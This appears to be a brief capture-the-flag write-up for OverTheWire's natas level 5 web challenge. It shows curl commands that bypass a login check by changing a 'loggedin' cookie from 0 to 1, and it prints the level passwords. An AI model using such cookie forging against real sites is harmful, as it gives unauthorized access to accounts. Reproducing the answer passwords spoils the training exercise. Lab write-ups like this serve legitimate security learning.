# natas level5
natas is CTF with web application.

## using credential is below.
- User:natas5
- Pass:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

check web site by lynx.
`lynx http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org`

followings is message of this page.
~~~
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
~~~

And I check request and response header, set-cookie has "loggedin=0".
~~~
curl http://natas5.natas.labs.overthewire.org -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --verbose
[response has following]
Set-Cookie: loggedin=0
~~~

I modified this header and request to same url, I got password.
`curl http://natas5.natas.labs.overthewire.org -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq -b "loggedin=1" --verbose`

natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1



